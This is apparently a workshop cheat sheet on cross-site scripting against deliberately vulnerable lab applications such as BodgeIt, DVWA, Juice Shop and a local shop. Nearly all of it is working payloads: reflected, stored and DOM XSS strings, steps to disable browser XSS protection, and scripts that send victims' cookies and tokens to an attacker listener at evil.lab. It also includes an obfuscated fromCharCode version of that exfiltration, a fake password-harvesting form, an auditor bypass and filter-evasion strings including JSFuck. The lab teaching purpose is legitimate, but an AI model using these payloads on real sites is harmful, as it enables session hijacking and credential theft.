# A3 Cross-Site Scripting (XSS)


## Refelcted

Got `ERR_BLOCKED_BY_XSS_AUDITOR` in your Chrome ? Try the `Iceweasel` in the VM ;]
Or just set `X-XSS-Protection: 0` in burp via `Proxy > Options > Match and Replace`
Or run Chrome/Chromium with `--disable-xss-auditor`

### BodgeIt store

`http://bodgeit.lab/bodgeit/search.jsp?q=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E`

`http://bodgeit.lab/bodgeit/search.jsp?q=<sCrIpt src='http://evil.lab:3000/hook.js'></ScRipT>`


### DVWA
Try it on `http://dvwa.lab/dvwa/vulnerabilities/xss_r`

GET `http://dvwa.lab/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E#`

```
<script>alert("XSS");</script>
<img src=x onerror=alert(document.cookie)>
```

## Stored


[BodgeIt / registration](http://bodgeit.lab/bodgeit/register.jsp)

`hacker@citadelo.com<scriPt>alert("XSS");</scRipt>`

trigger it 

`http://bodgeit.lab/bodgeit/admin.jsp`


[BodgeIt / Contact](http://bodgeit.lab/bodgeit/contact.jsp)

`<sCriPt>alert(document.cookie);</scRipT>`


priklad

Start a simple HTTP server as a listener

`python -m SimpleHTTPServer 8888`

```
</textarea><script>document.getElementById('header').innerHTML+='<img src="http://evil.lab:8888/?'+document.cookie+'&'+location.search+'"/>';</script><textarea cols="0" rows="0" style="display:none">
```

```
Sed scelerisque sed leo in rutrum. Etiam aliquet, nisl at facilisis ullamcorper, ante eros gravida mauris, quis gravida dolor ipsum at massa. Nam et ante eget sem volutpat dignissim eu ut diam. Etiam convallis dui at semper egestas. Curabitur dignissim, velit id suscipit ullamcorper
</textarea><script>document.getElementById('header').innerHTML+='<img src="http://evil.lab:8888/?'+document.cookie+'"/>';</script><textarea cols="0" rows="0">
```

```
document.getElementById('header').innerHTML+='<img src="http://evil.lab:8888/?'+document.cookie+'&token='+location.search.split('token=')[1].split('&')[0]+'"/>';
```

```
Sed scelerisque sed leo in rutrum. Etiam aliquet, nisl at facilisis ullamcorper, ante eros gravida mauris, quis gravida dolor ipsum at massa. Nam et ante eget sem volutpat dignissim eu ut diam. Etiam convallis dui at semper egestas. Curabitur dignissim, velit id suscipit ullamcorper</textarea><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,104,101,97,100,101,114,39,41,46,105,110,110,101,114,72,84,77,76,43,61,39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,54,46,54,46,54,47,63,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,39,38,116,111,107,101,110,61,39,43,108,111,99,97,116,105,111,110,46,115,101,97,114,99,104,46,115,112,108,105,116,40,39,116,111,107,101,110,61,39,41,91,49,93,46,115,112,108,105,116,40,39,38,39,41,91,48,93,43,39,34,47,62,39,59));</script><textarea cols="0" rows="0">
```

`</textarea><script src=http://evil.lab:3000/hook.js><textarea>`



## DOM based

### Juice Shop

Try this in search:

```
<iframe src="javascript:alert(document.domain)">
```

### AwesomeShop

`http://awesome.lab/oc/index.php?route=common/home#default=Slovak`

`http://awesome.lab/oc/index.php?route=common/home#default=%3Cscript%3Ealert%281%29%3C/script%3E`


#### XSS demo in my Firefox (password steal)

```
http://awesome.lab/oc/index.php?route=product/search&search=<h1>Hacked</h1>
http://awesome.lab/oc/index.php?route=product/search&search=<script>alert(1)</script>
http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=post><input type=text name=email><input type=password name=password></form><script>setTimeout(function(){alert(x[0].value%2b/ : /.source%2bx[1].value)},100);</script>
```

#### XSS demo in my Chrome (XSS Auditor bypass)

```
http://awesome.lab/oc/index.php?route=product/search&search=<xxx class=fancybox data-fancybox-start=1 data-fancybox-type=html data-fancybox-href="%26lt;script>alert(2);%26lt;/script>">
http://awesome.lab/oc/index.php?route=product/search&search=<form id=x method=post><input type=text name=email><input type=password name=password></form><xxx class=fancybox data-fancybox-start=1 data-fancybox-type=html data-fancybox-href="%26lt;script>setTimeout(function(){alert(x[0].value%2b/ : /.source%2bx[1].value)},3000);%26lt;/script>">
```    


## Slides

```
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
<IMG SRC='vbscript:msgbox("XSS")'>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<svg/onload=alert(’XSS')>

```


JSFuck

```javascript
<script>
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
</script>

```


